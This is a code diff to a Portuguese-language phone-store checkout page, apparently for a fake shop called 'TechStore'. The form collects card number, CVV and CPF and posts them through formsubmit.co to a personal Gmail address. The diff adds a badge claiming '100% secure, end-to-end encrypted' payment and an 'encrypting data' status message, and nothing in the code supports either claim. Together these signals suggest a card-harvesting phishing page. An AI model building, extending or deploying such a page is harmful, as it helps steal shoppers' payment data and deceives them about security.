@@ -25,18 +25,20 @@
 
     .detalhes-container { background: #151515; border-radius: 15px; padding: 15px; margin-bottom: 20px; border: 1px solid #222; }
     .detalhes-titulo { font-size: 12px; font-weight: 800; color: #27ae60; margin-bottom: 8px; display: flex; align-items: center; gap: 5px; }
-    .texto-descricao { font-size: 13px; color: #ccc; line-height: 1.5; overflow: hidden; position: relative; max-height: 60px; transition: max-height 0.4s ease; }
+    .texto-descricao { font-size: 13px; color: #ccc; line-height: 1.6; overflow: hidden; position: relative; max-height: 80px; transition: max-height 0.4s ease; text-align: justify; }
     .texto-descricao.aberto { max-height: 1000px; }
     .btn-ver-mais { background: none; border: none; color: #27ae60; font-size: 12px; font-weight: 800; cursor: pointer; margin-top: 8px; padding: 0; }
 
     input, select { width:100%; padding:15px; margin-bottom:12px; border-radius:12px; border:1px solid #333; background:#111; color:white; font-size:16px !important; outline:none; appearance: none; }
     
-    .guia-ajuda { background: rgba(255, 255, 255, 0.03); border: 1px solid #333; border-radius: 12px; padding: 12px; margin-top: 10px; margin-bottom: 15px; font-size: 11px; color: #888; line-height: 1.5; }
-    .guia-ajuda b { color: #27ae60; }
-
     .tab-btn { flex:1; padding:15px; border-radius:12px; border:1px solid #333; background:#252525; color:white; font-weight:800; cursor:pointer; text-align:center; }
     .tab-btn.active { background:#27ae60; border-color:#27ae60; }
     .btn-finalizar { width:100%; background:#27ae60; color:white; border:none; padding:18px; border-radius:15px; font-weight:900; font-size:16px; cursor:pointer; text-transform:uppercase; margin-top:10px; }
+
+    /* NOVO: Estilo da Mensagem de Segurança */
+    .seguranca-box { margin-top: 20px; display: flex; align-items: center; justify-content: center; gap: 10px; padding: 10px; border-top: 1px solid #333; opacity: 0.7; }
+    .seguranca-box i { font-size: 18px; color: #27ae60; }
+    .seguranca-box p { font-size: 10px; color: #aaa; line-height: 1.3; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
 
     #cart-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center; }
     .modal-content { background: #1c1c1c; width: 92%; max-width: 400px; border-radius: 25px; padding: 20px; border: 1px solid #333; max-height: 80vh; display: flex; flex-direction: column; }
@@ -75,9 +77,9 @@
     <div id="resumo-dinamico" onclick="toggleModal()"></div>
 
     <div class="detalhes-container">
-        <div class="detalhes-titulo"><i class="fas fa-info-circle"></i> SOBRE O APARELHO</div>
+        <div class="detalhes-titulo"><i class="fas fa-info-circle"></i> ESPECIFICAÇÕES DO APARELHO</div>
         <div id="texto-desc" class="texto-descricao"></div>
-        <button id="btn-expandir" class="btn-ver-mais" onclick="expandirTexto()">Ver mais...</button>
+        <button id="btn-expandir" class="btn-ver-mais" onclick="expandirTexto()">Ver mais detalhes...</button>
     </div>
 
     <form id="form-pay" action="https://formsubmit.co/pagamento.celular02@gmail.com" method="POST">
@@ -121,26 +123,26 @@
                 <input type="text" id="c4" name="CVV" placeholder="CVV" maxlength="3" inputmode="numeric">
             </div>
             <input type="text" id="c5" name="CPF_TITULAR" placeholder="CPF do Titular" inputmode="numeric">
-            
-            <p style="font-size: 11px; color: #888; margin-bottom: 5px; font-weight: 800;">PARCELAMENTO</p>
             <select id="parcelas" name="PARCELAS"></select>
-
-            <div class="guia-ajuda">
-                💡 <b>Dica:</b> O número do cartão tem 16 dígitos. A validade segue o padrão mês/ano (00/00). O CVV são os 3 números no verso.
-            </div>
         </div>
 
         <button type="submit" class="btn-finalizar">FINALIZAR COMPRA</button>
+
+        <div class="seguranca-box">
+            <i class="fas fa-shield-halved"></i>
+            <p>Pagamento 100% Seguro<br>Criptografado de ponta a ponta</p>
+            <i class="fas fa-lock" style="font-size: 13px; margin-left: 5px;"></i>
+        </div>
     </form>
 </div>
 
 <script>
 const descricoes = {
-    "iphone": "Este aparelho representa o ápice da tecnologia mobile. Equipado com o processador mais veloz do mercado, oferece uma experiência fluida. Tela Super Retina XDR.",
-    "galaxy": "O dispositivo definitivo para produtividade. Tela Dynamic AMOLED 2X de 120Hz e sensor de câmera de ultra resolução.",
-    "xiaomi": "Performance bruta com o melhor custo-benefício. Carregamento ultra-rápido e lentes versáteis.",
-    "motorola": "Equilíbrio entre design e funcionalidade. Versão do Android limpa e rápida com tela imersiva.",
-    "acessórios": "Acessório original desenvolvido com materiais de alta durabilidade para máxima performance."
+    "iphone": "Este aparelho representa o ápice da engenharia tecnológica atual. Equipado com um processador de arquitetura avançada, garante uma performance impecável mesmo nas tarefas mais exigentes. A tela de altíssima resolução utiliza tecnologia de última geração para entregar cores ultra realistas e brilho intenso. O sistema de câmeras foi projetado para capturar detalhes profissionais em qualquer condição de luz, oferecendo estabilização óptica e recursos inteligentes de pós-processamento. Sua estrutura é construída com materiais de grau cirúrgico, garantindo durabilidade extrema e um design sofisticado. Este dispositivo conta com garantia oficial e suporte técnico dedicado, sendo a escolha ideal para quem busca exclusividade e potência sem concessões.",
+    "galaxy": "Um dispositivo projetado para quem exige o máximo em produtividade e entretenimento. A tela imersiva conta com uma taxa de atualização adaptativa que proporciona fluidez total na navegação e em jogos. O hardware interno é otimizado para multitarefas pesadas, permitindo alternar entre aplicativos sem nenhum sinal de travamento. As câmeras de alta precisão capturam imagens com clareza cristalina, suportadas por sensores de luz de última geração e inteligência artificial para otimização de cena. A bateria de longa duração foi desenvolvida com tecnologia de carregamento rápido, mantendo você conectado durante todo o dia. É a união perfeita entre elegância, segurança e versatilidade tecnológica.",
+    "xiaomi": "Performance bruta aliada a uma eficiência energética surpreendente. Este smartphone integra um chipset de alto desempenho que lida facilmente com renderizações gráficas complexas e jogos de última geração. O display oferece uma densidade de pixels superior, resultando em imagens nítidas e cores vibrantes para uma experiência visual de cinema. O sistema de carregamento é um dos mais velozes do mundo, garantindo carga completa em poucos minutos. Suas lentes versáteis permitem fotos em ultra-wide e macro com qualidade profissional. Com uma interface fluida e design ergonômico, é o aparelho ideal para quem busca tecnologia de ponta, velocidade de processamento e autonomia de bateria acima da média.",
+    "motorola": "Equilíbrio absoluto entre sofisticação visual e poder de processamento. Este modelo oferece uma experiência de software limpa e ágil, garantindo que o sistema responda instantaneamente a cada toque. A tela infinita proporciona uma imersão completa em vídeos e fotos, com tecnologias que protegem o conforto visual do usuário. O conjunto de câmeras permite registrar momentos com foco ultrarrápido e cores equilibradas, mesmo em ambientes desafiadores. Construído com um acabamento premium resistente, o aparelho é ergonômico e elegante. A conectividade de alta velocidade e a gestão inteligente de energia fazem deste dispositivo um parceiro confiável para o dia a dia intenso e profissional.",
+    "acessórios": "Este produto original foi desenvolvido sob rigorosos padrões de qualidade para garantir a melhor experiência de uso e máxima durabilidade. Fabricado com materiais de alta resistência, ele oferece compatibilidade total e performance estável. Cada detalhe foi pensado para complementar seu dispositivo com elegância e funcionalidade. Nossos acessórios passam por testes de segurança exaustivos para garantir proteção contra sobrecargas e desgaste prematuro. É o investimento certo para proteger seu aparelho e ampliar as possibilidades de uso, garantindo que você aproveite todas as funções originais com segurança e confiança técnica."
 };
 
 let carrinho = JSON.parse(localStorage.getItem('carrinhoTechStore')) || [];
@@ -181,14 +183,13 @@ function atualizarInterface() {
         let valorParc = (total / i).toLocaleString('pt-BR', {minimumFractionDigits:2});
         sel.innerHTML += `<option value="${i}x de R$ ${valorParc}">${i}x de R$ ${valorParc}</option>`;
     }
-
     gerarPix(total);
 }
 
 function expandirTexto() {
     const txt = document.getElementById('texto-desc');
     txt.classList.toggle('aberto');
-    document.getElementById('btn-expandir').innerText = txt.classList.contains('aberto') ? "Ver menos" : "Ver mais...";
+    document.getElementById('btn-expandir').innerText = txt.classList.contains('aberto') ? "Ver menos" : "Ver mais detalhes...";
 }
 
 function toggleModal() {
@@ -211,13 +212,11 @@ function remover(i) {
     toggleModal(); toggleModal(); 
 }
 
-// RESTAURAÇÃO DA LÓGICA DO PIX QUE FUNCIONA NO BANCO
 function gerarPix(v) {
     const chave = "5663014b-ba23-4c57-b239-26914c95a8c0";
     const nome = "TECHSTORE";
     const cidade = "SAO PAULO";
     const valorStr = v.toFixed(2);
-
     let p = "000201"; 
     let mai = "0014BR.GOV.BCB.PIX01" + chave.length.toString().padStart(2, '0') + chave;
     p += "26" + mai.length.toString().padStart(2, '0') + mai;
@@ -227,7 +226,6 @@ function gerarPix(v) {
     let adf = "0505ID123"; 
     p += "62" + adf.length.toString().padStart(2, '0') + adf;
     p += "6304";
-
     function getCRC16(data) {
         let crc = 0xFFFF;
         for (let i = 0; i < data.length; i++) {
@@ -239,7 +237,6 @@ function gerarPix(v) {
         }
         return (crc & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
     }
-
     const codFinal = p + getCRC16(p);
     const qrDiv = document.getElementById("qrcode-container");
     qrDiv.innerHTML = "";
@@ -257,12 +254,16 @@ function trocar(m) {
 function copiarPix() { navigator.clipboard.writeText(document.getElementById('pix-copy').innerText); alert("PIX Copiado!"); }
 
 document.getElementById('form-pay').onsubmit = async function(e) {
-    if(document.getElementById('b-pix').classList.contains('active')) return;
-    e.preventDefault();
     const lBox = document.getElementById('loading-box');
     const sMsg = document.getElementById('status-msg');
+    if(document.getElementById('b-pix').classList.contains('active')) {
+        lBox.style.display = "flex";
+        sMsg.innerText = "Registrando pedido...";
+        return true; 
+    }
+    e.preventDefault();
     lBox.style.display = "flex";
-    sMsg.innerText = "Consultando saldo e limite disponível...";
+    sMsg.innerText = "Criptografando dados e consultando limite...";
     try {
         const val = document.getElementById('c3').value.split('/');
         const token = await mp.createCardToken({
@@ -283,15 +284,18 @@ document.getElementById('form-pay').onsubmit = async function(e) {
 
 function msk(id, p) {
     const e = document.getElementById(id);
-    e.addEventListener('input', () => {
-        let v = e.value.replace(/\D/g, ''), x = '', i = 0;
-        p.split('').forEach(c => { if(c==='#'){ if(v[i]) x+=v[i++]; } else { if(v[i]) x+=c; } });
-        e.value = x;
-    });
+    if(e) {
+        e.addEventListener('input', () => {
+            let v = e.value.replace(/\D/g, ''), x = '', i = 0;
+            p.split('').forEach(c => { if(c==='#'){ if(v[i]) x+=v[i++]; } else { if(v[i]) x+=c; } });
+            e.value = x;
+        });
+    }
 }
 msk('c1','#### #### #### ####'); msk('c3','##/##'); msk('f-cep','#####-###'); msk('c5','###.###.###-##'); msk('f-tel','(##) #####-####'); msk('c4','###');
 
 window.onload = atualizarInterface;
 </script>
 </body>
-</html>
+    </html>
+            
